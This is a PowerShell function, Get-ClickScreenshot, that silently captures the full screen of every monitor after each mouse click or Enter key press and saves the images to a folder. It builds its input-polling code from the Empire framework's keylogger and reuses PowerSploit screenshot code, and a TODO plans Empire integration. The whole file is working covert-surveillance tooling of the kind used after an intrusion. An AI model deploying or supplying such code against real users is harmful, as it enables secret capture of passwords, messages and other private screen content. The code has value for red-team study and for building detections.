function Get-ClickScreenshot
{
<#
.SYNOPSIS

Takes screenshots after each mouse click. 

.DESCRIPTION

A function that takes screenshots every mouse click and saves them to a folder.
TODO: screenshot on mousewheel scroll. Requires hooking
TODO: highlight mouse location
TODO: option to capture only the screen that the click happened in multi-monitor environments
TODO: zip archive and powershell empire integration
TODO: integrate with Get-TimedScreenshot 

.PARAMETER Path

Specifies the folder path.
    
.PARAMETER EndTime

Specifies when the script should stop running in the format HH-MM 

.PARAMETER MaxScreenshots

Specifies the max number of screenshots to be taken. If reached, the script will close even if it hasn't reached the end time yet. 

.PARAMETER EnterKey

Specifies if the script should screenshot on enter key event as well as mouseclick 

.EXAMPLE 

PS C:\> Get-ClickScreenshot -Path c:\temp\ -EndTime 14:00 

#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]             
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path, 

        [Parameter(Mandatory=$False)]             
        [String] $EndTime,

        [Parameter(Mandatory=$False)]             
        [String] $MaxScreenshots,

        [Parameter(Mandatory=$False)]             
        [Switch] $EnterKey
    )

    #borrowed from Empire's Get-Keystrokes.ps1
    try
        {
            $ImportDll = [User32]
        }
        catch
        {
            $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
            $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
            $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

            $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
            $FieldArray = [Reflection.FieldInfo[]] @(
                [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
                [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
                [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
                [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
                [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
                [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
            )

            $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
            $FieldValueArray = [Object[]] @(
                'GetAsyncKeyState',
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
            $FieldValueArray = [Object[]] @(
                'GetKeyboardState',
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
            $FieldValueArray = [Object[]] @(
                'MapVirtualKey',
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
                [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
            $FieldValueArray = [Object[]] @(
                'ToUnicode',
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
            $FieldValueArray = [Object[]] @(
                'GetForegroundWindow',
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $ImportDll = $TypeBuilder.CreateType()
        }
    #modified from PowerSploit Get-TimedScreenshot.ps1 
    #improved to capture all screens instead of just the main screen
    Function Get-Screenshot ($FilePath) {
        $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $ScreenBounds.Width
        $Height = $ScreenBounds.Height

        $Size = New-Object System.Drawing.Size($Width, $Height)
        $Point = New-Object System.Drawing.Point(0, 0)

        $ScreenshotObject = New-Object Drawing.Bitmap $Width, $Height
        $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
        $DrawingGraphics.CopyFromScreen($ScreenBounds.Left, $ScreenBounds.Top, 0, 0, $Size);
        $DrawingGraphics.Dispose()
        $ScreenshotObject.Save($FilePath)
        $ScreenshotObject.Dispose()
    }
    Add-Type -Assembly System.Windows.Forms 
    $ClickCount = 0; 
    #continue forever if EndTime not specified
    while((-not $EndTime) -or ((Get-Date -Format HH:mm) -lt $EndTime)) {
        #EX: 3-27-2018--12-36-41.png
        $Time = (Get-Date)
        [String] $FileName = "$($Time.Month)"
        $FileName += '-'
        $FileName += "$($Time.Day)" 
        $FileName += '-'
        $FileName += "$($Time.Year)"
        $FileName += '--'
        $FileName += "$($Time.Hour)"
        $FileName += '-'
        $FileName += "$($Time.Minute)"
        $FileName += '-'
        $FileName += "$($Time.Second)"
        $FileName += '.png'
            
        #use join-path to add path to filename
        [String] $FilePath = (Join-Path $Path $FileName)
        Start-Sleep -Milliseconds 300
        $RightClickState = $ImportDll::GetAsyncKeyState(0x01)
        $LeftClickState = $ImportDll::GetAsyncKeyState(0x02)
        $MidClickState = $ImportDll::GetAsyncKeyState(0x04)
        $EnterKeyState = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
        if ($EnterKey) {
            $EventTrigger = $RightClickState -or $MidClickState -or $LeftClickState -or $EnterKeyState
        } else {
            $EventTrigger = $RightClickState -or $MidClickState -or $LeftClickState
        }
        if( $MaxScreenshots -and ($ClickCount -ge $MaxScreenshots)) {
            return
        }
        if ($EventTrigger) {
            Start-Sleep -Milliseconds 50
            Get-Screenshot $FilePath
            $ClickCount++
            #Start-Sleep -Milliseconds 300
        }
    }
}
